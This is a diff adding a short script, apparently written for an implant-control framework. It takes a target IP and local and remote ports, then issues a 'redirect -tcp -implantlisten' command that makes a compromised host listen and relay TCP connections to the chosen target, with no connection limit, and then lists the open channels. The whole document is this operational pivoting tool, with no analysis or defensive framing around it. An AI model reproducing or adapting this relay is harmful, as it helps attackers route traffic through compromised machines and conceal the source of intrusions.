@@ -1,0 +1,42 @@
+
+bool $showUsage = false;
+bool $success = true;
+
+string $l_port="1509";
+string $r_port="1509";
+string $tgt_IP="127.0.0.1";
+
+if ($argc < 2){
+    $showUsage = true;
+    $success = false;
+} else if ($argv[1] == "?") {
+    $showUsage = true;
+} else if ($argc > 4) {
+    $showUsage = true;
+    $success = false;
+} else if ($argc < 1) {
+    $showUsage = true;
+    $success = false;
+}
+
+if ($showUsage) {
+    echo "Usage: <tgt_IP <local_port> <dst_port>";
+    return $success;
+}
+
+if ($argc >= 2) {
+	$tgt_IP=$argv[1];
+}
+if ($argc >= 3) {
+	$l_port=$argv[2];
+}
+if ($argc >= 4) {
+	$r_port=$argv[3];
+}
+
+if (!`redirect -tcp -implantlisten $l_port -target $tgt_IP $r_port -connections 0`) {
+	echo "Error in redirection!";
+	$success=false;
+}
+`channels`;
+return $success;
